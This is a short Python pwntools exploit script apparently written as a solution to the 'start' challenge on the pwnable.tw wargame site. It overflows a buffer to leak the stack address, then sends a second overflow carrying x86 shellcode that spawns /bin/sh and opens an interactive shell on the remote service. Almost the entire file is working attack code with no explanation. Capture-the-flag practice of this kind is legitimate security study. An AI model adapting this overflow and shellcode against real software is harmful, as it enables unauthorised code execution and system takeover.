#coding=utf-8
from pwn import *

stack = 0xffffd594
ret = 0xffffd5a8

shell = '\x31\xd2\x31\xc9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\xb0\x0b\xcd\x80'
#shell = '\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'

r = remote('chall.pwnable.tw', 10000)
#r = process('./start')
#gdb.attach(r)

leak_esp = 0x8048087
r.recvuntil('CTF:')
r.send('a' * 20 + p32(leak_esp))

esp = r.recv(100)
print esp.encode('hex')
esp = int((esp[:4][::-1]).encode('hex'), 16)
print hex(esp)

target = esp + 20
r.send('a' * 20 + p32(target) + shell)
r.interactive()
